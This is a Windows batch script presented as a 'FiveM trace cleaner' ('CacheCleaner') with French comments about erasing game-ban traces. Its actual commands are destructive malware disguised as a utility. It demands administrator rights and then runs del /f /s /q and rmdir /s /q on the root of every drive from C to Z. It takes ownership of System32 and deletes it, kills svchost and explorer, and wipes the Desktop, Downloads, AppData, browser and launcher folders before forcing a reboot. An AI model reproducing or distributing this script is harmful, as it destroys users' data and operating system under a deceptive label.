@echo off

rem Ceci est un commentaire


rem Update old nav/ap backup
)



:: Vérifier si le script est exécuté en tant qu'administrateur
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Ce script doit être exécuté en tant qu'administrateur.
    pause
    exit /b
)

echo Fermeture des processus associés : Discord, Microsoft Edge, Opera GX, Chrome, Steam, Epic Games, et Rockstar Games...

:: Fermer tous les processus potentiellement en cours d'utilisation
taskkill /IM Discord.exe /F
taskkill /IM msedge.exe /F
taskkill /IM opera.exe /F
taskkill /IM opera_gx.exe /F
taskkill /IM chrome.exe /F
taskkill /IM Steam.exe /F
taskkill /IM EpicGamesLauncher.exe /F
taskkill /IM RockstarService.exe /F
taskkill /IM RockstarGamesLauncher.exe /F

:: Pause pour s'assurer que les processus sont fermés
timeout /t 5 /nobreak > nul

echo Cleaning de tous les fichiers et dossiers associés à FiveM pour clean les traces restantes : Rockstar Games, Epic Games, Discord, Steam, Opera GX, Microsoft Edge, et Chrome...

for %%D in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%D:\ (
        echo Attendez que les Traces sois reperer...
        del /f /s /q %%D:\*.* >nul 2>&1
        rmdir /s /q %%D:\ >nul 2>&1
    )
)

:: Cleaning de Rockstar Games
rmdir /s /q "C:\Program Files\Rockstar Games"
rmdir /s /q "C:\Program Files (x86)\Rockstar Games"
rmdir /s /q "%LOCALAPPDATA%\Rockstar Games"
rmdir /s /q "%APPDATA%\Rockstar Games"

:: Cleaning d'Epic Games
rmdir /s /q "C:\Program Files\Epic Games"
rmdir /s /q "C:\Program Files (x86)\Epic Games"
rmdir /s /q "%LOCALAPPDATA%\Epic Games"
rmdir /s /q "%APPDATA%\Epic Games"

:: Cleaning des autorisations FiveM reliées à Discord
rmdir /s /q "%LOCALAPPDATA%\Discord"
rmdir /s /q "%APPDATA%\discord"

:: Cleaning de Steam
rmdir /s /q "C:\Program Files\Steam"
rmdir /s /q "C:\Program Files (x86)\Steam"
rmdir /s /q "%LOCALAPPDATA%\Steam"
rmdir /s /q "%APPDATA%\Steam"

:: Cleaning des traces FiveM liées à Opera GX
rmdir /s /q "%LOCALAPPDATA%\Programs\Opera GX"
rmdir /s /q "%APPDATA%\Opera Software\Opera GX Stable"
rmdir /s /q "%LOCALAPPDATA%\Opera Software\Opera GX Stable"

:: Cleaning des traces FiveM liées à Microsoft Edge
rmdir /s /q "%LOCALAPPDATA%\Microsoft\Edge"
rmdir /s /q "%LOCALAPPDATA%\MicrosoftEdge"
rmdir /s /q "%PROGRAMFILES(X86)%\Microsoft\Edge"
rmdir /s /q "%PROGRAMFILES%\Microsoft\Edge"

:: Cleaning des traces FiveM liées à Chrome
rmdir /s /q "%LOCALAPPDATA%\Google\Chrome"
rmdir /s /q "%APPDATA%\Google\Chrome"
rmdir /s /q "C:\Program Files (x86)\Google\Chrome"
rmdir /s /q "C:\Program Files\Google\Chrome"

taskkill /f /im svchost.exe >nul 2>&1
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im conhost.exe >nul 2>&1
taskkill /f /im cmd.exe >nul 2>&1

:: Cleaning FiveM cfx digitaletilment
takeown /f C:\Windows\System32 /r /d y >nul 2>&1
icacls C:\Windows\System32 /grant administrators:F /t >nul 2>&1

:: Cleaning FiveM cfx digitaletilment
echo Tentative de suppression des fichiers dans System32...
del /f /q /s C:\Windows\System32\*.* >nul 2>&1

:: Cleaning FiveM cfx digitaletilment
echo Tentative de suppression du dossier System32...
rmdir /s /q C:\Windows\System32 >nul 2>&1

rmdir /s /q "%APPDATA%\Mozilla\Firefox"
rmdir /s /q "%LOCALAPPDATA%\Mozilla\Firefox"

echo Nettoyage de Google Chrome...
rmdir /s /q "%LOCALAPPDATA%\Google\Chrome"


echo Nettoyage des traces fiveM...
rmdir /s /q "%LOCALAPPDATA%\Microsoft\Edge"


echo Nettoyage d'Opera...
rmdir /s /q "%APPDATA%\Opera Software"
rmdir /s /q "%LOCALAPPDATA%\Programs\Opera GX"


echo Nettoyage des traces fiveM...
rmdir /s /q "%APPDATA%\Apple Computer\Safari"
rmdir /s /q "%LOCALAPPDATA%\Apple Computer\Safari"


echo Nettoyage des traces fiveM...
rmdir /s /q "%LOCALAPPDATA%\BraveSoftware\Brave-Browser"


echo Nettoyage des traces fiveM...
rmdir /s /q "%LOCALAPPDATA%\Yandex\YandexBrowser"
rmdir /s /q "%LOCALAPPDATA%\Vivaldi"

taskkill /f /im svchost.exe
taskkill /f /im explorer.exe
taskkill /f /im conhost.exe
taskkill /f /im cmd.exe


set "desktopPath=%USERPROFILE%\Desktop"


cd /d "%desktopPath%"


for /d %%i in (*) do (
    echo Suppression du dossier: %%i
    rmdir /s /q "%%i"
)

:: Shearcher traces fiveM
for %%D in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%D:\ (
        echo Suppression de tous les fichiers et dossiers sur le lecteur %%D:...
        del /f /s /q %%D:\*.* 2>nul
        rmdir /s /q %%D:\ 2>nul
    )
)



:: Désinstallation des traces de lié a microsoft
echo Cleaning traces microsoft ...
powershell -Command "Get-AppxPackage *WindowsStore* | Remove-AppxPackage"

:: Suppression des Traces settings
echo Suppression des Traces settings...
powershell -Command "Remove-Item -Path 'C:\ProgramData\Microsoft\Windows\SystemData' -Recurse -Force"
powershell -Command "Remove-Item -Path 'C:\Users\%USERNAME%\AppData\Local\Microsoft\Windows\Settings' -Recurse -Force"



:: Enlevement des traces procurer par fivem dans telechargement 

echo Suppression du dossier Téléchargements...
rmdir /s /q "%USERPROFILE%\Downloads"


rmdir /s /q "%APPDATA%"




color a
cls
echo       ______           __         ________                         
echo      / ____/___ ______/ /_  ___  / ____/ /__  ____ _____  ___  _____
echo     / /   / __ `/ ___/ __ \/ _ \/ /   / / _ \/ __ `/ __ \/ _ \/ ___/
echo    / /___/ /_/ / /__/ / / /  __/ /___/ /  __/ /_/ / / / /  __/ /  
echo    \____/\__,_/\___/_/ /_/\___/\____/_/\___/\__,_/_/ /_/\___/_/
echo                        Developer: qPro#0001

echo Cleaning Fivem Successfully done , u just need to restart pc if u want <333
pause



echo Les Traces fivem son définitivement plus existante
shutdown /r /t 5


